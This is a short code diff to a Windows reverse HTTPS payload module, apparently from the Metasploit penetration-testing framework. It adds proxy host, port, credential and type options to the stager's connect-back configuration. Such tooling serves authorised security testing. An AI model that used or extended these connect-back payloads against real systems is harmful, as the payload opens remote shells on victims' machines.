@@ -51,7 +51,12 @@ module Payload::Windows::ReverseHttps
       host: datastore['LHOST'],
       port: datastore['LPORT'],
       url:  generate_uri,
-      exitfunk: datastore['EXITFUNC']
+      exitfunk: datastore['EXITFUNC'],
+      proxy_host: datastore['StagerProxyHost'],
+      proxy_port: datastore['StagerProxyPort'],
+      proxy_user: datastore['StagerProxyUser'],
+      proxy_pass: datastore['StagerProxyPass'],
+      proxy_type: datastore['StagerProxyType']
     }
 
     generate_reverse_https(conf)
